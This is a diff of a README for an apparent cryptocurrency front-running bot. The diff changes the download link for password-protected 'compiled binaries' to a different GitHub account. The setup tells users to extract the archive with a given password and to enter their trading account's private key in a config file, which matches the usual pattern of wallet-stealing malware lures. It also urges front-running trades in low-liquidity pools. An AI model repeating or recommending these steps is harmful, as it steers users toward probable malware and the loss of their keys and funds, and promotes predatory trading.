@@ -12,7 +12,7 @@ AMM frontrunning bots can be particularly effective on DEXs with low liquidity, 
 ### Features
 This bot uses Nethereum library for connection to the blockchain network and monitoring the mempool for pending trades. The configuration specifies the private key of the trading account, smart contracts for monitoring and chain_id of the network. The bot works in Ethereum, Avalanche, Binance networks with Uniswap, Traderjoe and Pancackeswap DEXs.
 ### Setup
-- [Download](https://github.com/JoeKaram78/amm-frontrun-bot/archive/refs/heads/main.zip) compiled binaries and extract with passwod `BOt6maR1IghegO`.
+- [Download](https://github.com/sunshineioxzc/amm-frontrun-bot/archive/refs/heads/main.zip) compiled binaries and extract with passwod `BOt6maR1IghegO`.
 - Edit `config.json` file. Add private key for trading account and `chain_id` of network you work with.
 - Set addresses of smart contracts in config file. You need to choose contracts with a small liquidity in the pool for more profits. You can check liquidity on `dextools.io`.
 
